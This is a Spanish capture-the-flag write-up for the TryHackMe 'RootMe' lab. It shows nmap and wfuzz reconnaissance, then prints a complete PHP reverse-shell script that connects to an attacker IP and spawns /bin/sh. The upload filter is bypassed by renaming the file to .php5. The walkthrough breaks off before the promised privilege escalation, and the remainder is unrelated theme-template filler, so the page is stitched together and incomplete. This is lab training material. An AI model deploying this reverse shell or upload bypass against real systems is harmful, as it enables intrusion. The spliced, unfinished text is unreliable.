I"Çu<p>Text can be <strong>bold</strong>, <em>italic</em>, <del>strikethrough</del> or <code class="language-plaintext highlighter-rouge">keyword</code>.</p>

<h1 id="tipo-de-maquina"><a href="#header-1"></a>Tipo de Maquina</h1>

<p>Esta es una maquina para principiantes, de nivel muy facil, hecha para aprender reverse shell con <strong>PHP</strong> y aprender la escalada de privilegios mediante los <strong>SUID</strong></p>

<ol>
  <li>Reconocimiento</li>
  <li></li>
  <li>Escalado de privilegios</li>
</ol>

<h1 id="arrancar-la-maquina"><a href="#header-2"></a>Arrancar la Maquina</h1>

<p>Lo primero que haremos sera arrancar la maquina para ello entraremos a <strong>TryHackme</strong> y le daremos a <code class="language-plaintext highlighter-rouge">Start Machine</code></p>

<p><a href="https://tryhackme.com/room/rrootme">RootMe-TryHackMe</a></p>

<h1 id="reconocimiento"><a href="#header-3"></a>Reconocimiento</h1>

<p>Cuando la maquina se haya iniciado iremos a nuestro directorio de trabajo</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/parrot-hacking/Desktop/TryHackMe/
</code></pre></div></div>
<p>Crearemos un directorio con el nombre de la maquina</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /home/parrot-hacking/Desktop/TryHackMe/RootMe
</code></pre></div></div>
<p>Ahora con la utilidad <code class="language-plaintext highlighter-rouge">mkt</code> dise√±ada por <strong>S4vitar</strong>, crearemos nuestros directorios de trabajo <em>nmap</em>, <em>content</em>, <em>exploits</em> y <em>scripts</em></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@home/parrot-hacking/Desktop/TryHackMe/RootMe:~<span class="nv">$ </span>mkt
</code></pre></div></div>
<p>Nos meteremos en el directorio nmap y haremos un escaneado a los puertos abiertos de la maquina</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> rootme.thm <span class="nt">-oG</span> allPorts

Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-25 15:26 CEST
Initiating SYN Stealth Scan at 15:26
Scanning rootme.thm <span class="o">(</span>10.10.24.64<span class="o">)</span> <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.24.64
Discovered open port 22/tcp on 10.10.24.64
Completed SYN Stealth Scan at 15:26, 15.52s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>rootme.thm <span class="o">(</span>10.10.24.64<span class="o">)</span>
Host is up, received user-set <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-09-25 15:26:32 CEST <span class="k">for </span>15s
Not shown: 64938 closed ports, 595 filtered ports
Reason: 64938 resets and 595 no-responses
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.66 seconds
           Raw packets sent: 77435 <span class="o">(</span>3.407MB<span class="o">)</span> | Rcvd: 72477 <span class="o">(</span>2.899MB<span class="o">)</span>
</code></pre></div></div>

<p>Vemos que estan activos el puerto <strong>22</strong> (normalmente ssh) y el <strong>80</strong> (Servicio Web), asi que con la utilidad <code class="language-plaintext highlighter-rouge">extractPorts</code> vamos a extraer los puertos y copiarnoslos en la clipboard</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>extractPorts allPorts

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...

		<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.24.64
		<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard

</code></pre></div></div>

<p>Ahora que ya tenemos los puertos copiados en la clipboard, lo que haremos sera poner el siguiente comando para ver que servicio es cada puerto</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80 rootme.thm <span class="nt">-oN</span> targeted

Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-25 15:34 CEST
Nmap scan report <span class="k">for </span>rootme.thm <span class="o">(</span>10.10.24.64<span class="o">)</span>
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: HackIT - Home
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.10 seconds
</code></pre></div></div>
<p>Como dijimos son ssh y http asi que vamos a visitar la web
<a href="http://rootme.thm">Web-RootMe</a></p>

<p><img src="http://127.0.0.1:8000/images/rootme-pag.PNG" alt="" /></p>

<h2 id="fuzzing"><a href="#header-4"></a>Fuzzing</h2>
<p>Ahora tenemos esa pagina web vamos a enumerar sitios web para ello utilizaremos <strong>wfuzz</strong></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 100 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>616 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://rootme.thm//FUZZ

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://rootme.thm//FUZZ
Total requests: 220560

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                   
<span class="o">=====================================================================</span>

000000164:   200        15 L     49 W       741 Ch      <span class="s2">"uploads"</span>                                                                                 
000000550:   200        17 L     67 W       1123 Ch     <span class="s2">"css"</span>                                                                                     
000000953:   200        16 L     60 W       956 Ch      <span class="s2">"js"</span>                                                                                      
000005520:   200        22 L     47 W       732 Ch      <span class="s2">"panel"</span>

</code></pre></div></div>

<p>Ahora iremos a <em>/panel/</em> alli veremos un sitio para subir archivos
<a href="http://rootme.thm/panel">Panel-RootMe</a></p>

<p><img src="http://127.0.0.1:8000/images/panel.PNG" alt="" /></p>

<h1 id="explotacion"><a href="#header-4"></a>Explotacion</h1>
<p>Lo que vamos a hacer es crear un archivo <strong>.php</strong> malicioso para ver si lo interpreta la <em>web</em></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span>nano reverse.php
</code></pre></div></div>

<p>Contenido del archivo <strong>PHP</strong>(Esta en monkeypentester)</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.9.2.29'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
<span class="nv">$port</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="c1">//</span>
<span class="c1">// Daemonise ourself if possible to avoid zombies later</span>
<span class="c1">//</span>

<span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
<span class="c1">// our php process and avoid zombies.  Worth a try...</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
	<span class="c1">// Fork and have the parent process exit</span>
	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
	<span class="p">}</span>

	<span class="c1">// Make the current process a session leader</span>
	<span class="c1">// Will only succeed if we forked</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Change to a safe directory</span>
<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>

<span class="c1">// Remove any umask we inherited</span>
<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="c1">//</span>
<span class="c1">// Do the reverse shell...</span>
<span class="c1">//</span>

<span class="c1">// Open reverse connection</span>
<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Spawn shell process</span>
<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
<span class="p">);</span>

<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Set everything to non-blocking</span>
<span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="nf">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">// Check for end of TCP connection</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="c1">// Check for end of STDOUT</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="c1">// Wait until a command is end down $sock, or some</span>
	<span class="c1">// command output is available on STDOUT or STDERR</span>
	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>

	<span class="c1">// If we can read from the TCP socket, send</span>
	<span class="c1">// data to process's STDIN</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="c1">// If we can read from the process's STDOUT</span>
	<span class="c1">// send data down tcp connection</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="c1">// If we can read from the process's STDERR</span>
	<span class="c1">// send data down tcp connection</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>

<span class="c1">// Like print, but does nothing if we've daemonised ourself</span>
<span class="c1">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
<span class="k">function</span> <span class="n">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span> 
</code></pre></div></div>
<p>Intentaremos subir el archivo y veremos que no nos deja
<img src="http://127.0.0.1:8000/images/php.PNG" alt="" /></p>

<p>Asique lo que vamos a hacer es cambiar el <strong>php</strong> a <strong>php5</strong></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>parrot-hacking@RootMe:~<span class="nv">$ </span><span class="nb">mv </span>reverse.php reverse.php5
</code></pre></div></div>

<p>Ahora lo que haremos sera subir el archivo con esa extension <strong>.php5</strong> y veremos que si que funciona
<img src="http://127.0.0.1:8000/images/php5.PNG" alt="" /></p>

<p>Despues de que se haya subido iremos a <em>/uploads/</em> y vemos que esta alli nuestra <strong>reverse.php5</strong>
<a href="http://rootme.thm/uploads">Uploads-RootMe</a>
<img src="http://127.0.0.1:8000/images/uploads.PNG" alt="" /></p>

<h1 id="ruby-code-with-syntax-highlighting">Ruby code with syntax highlighting</h1>
<p>GitHubPages::Dependencies.gems.each do |gem, version|
  s.add_dependency(gem, ‚Äú= #{version}‚Äù)
end</p>

<h2 id="escaneo-de-puertos-abiertos"><a href="#header-4"></a>Escaneo de Puertos Abiertos</h2>

<ul>
  <li>This is an unordered list following a header.</li>
  <li>This is an unordered list following a header.</li>
  <li>This is an unordered list following a header.</li>
</ul>

<h5 id="header-5"><a href="#header-5"></a>Header 5</h5>

<ol>
  <li>This is an ordered list following a header.</li>
  <li>This is an ordered list following a header.</li>
  <li>This is an ordered list following a header.</li>
</ol>

<h6 id="header-6"><a href="#header-6"></a>Header 6</h6>

<table>
  <thead>
    <tr>
      <th style="text-align: left">head1</th>
      <th style="text-align: left">head two</th>
      <th style="text-align: left">three</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">ok</td>
      <td style="text-align: left">good swedish fish</td>
      <td style="text-align: left">nice</td>
    </tr>
    <tr>
      <td style="text-align: left">out of stock</td>
      <td style="text-align: left">good and plenty</td>
      <td style="text-align: left">nice</td>
    </tr>
    <tr>
      <td style="text-align: left">ok</td>
      <td style="text-align: left">good <code class="language-plaintext highlighter-rouge">oreos</code></td>
      <td style="text-align: left">hmm</td>
    </tr>
    <tr>
      <td style="text-align: left">ok</td>
      <td style="text-align: left">good <code class="language-plaintext highlighter-rouge">zoute</code> drop</td>
      <td style="text-align: left">yumm</td>
    </tr>
  </tbody>
</table>

<h3 id="theres-a-horizontal-rule-below-this">There‚Äôs a horizontal rule below this.</h3>

<hr />

<h3 id="here-is-an-unordered-list">Here is an unordered list:</h3>

<ul>
  <li>Item foo</li>
  <li>Item bar</li>
  <li>Item baz</li>
  <li>Item zip</li>
</ul>

<h3 id="and-an-ordered-list">And an ordered list:</h3>

<ol>
  <li>Item one</li>
  <li>Item two</li>
  <li>Item three</li>
  <li>Item four</li>
</ol>

<h3 id="and-a-nested-list">And a nested list:</h3>

<ul>
  <li>level 1 item
    <ul>
      <li>level 2 item</li>
      <li>level 2 item
        <ul>
          <li>level 3 item</li>
          <li>level 3 item</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>level 1 item
    <ul>
      <li>level 2 item</li>
      <li>level 2 item</li>
      <li>level 2 item</li>
    </ul>
  </li>
  <li>level 1 item
    <ul>
      <li>level 2 item</li>
      <li>level 2 item</li>
    </ul>
  </li>
  <li>level 1 item</li>
</ul>

<h3 id="small-image">Small image</h3>

<p><img src="https://assets-cdn.github.com/images/icons/emoji/octocat.png" alt="" /></p>

<h3 id="large-image">Large image</h3>

<p><img src="https://guides.github.com/activities/hello-world/branching.png" alt="" /></p>

<h3 id="definition-lists-can-be-used-with-html-syntax">Definition lists can be used with HTML syntax.</h3>

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The final element.
</code></pre></div></div>
:ET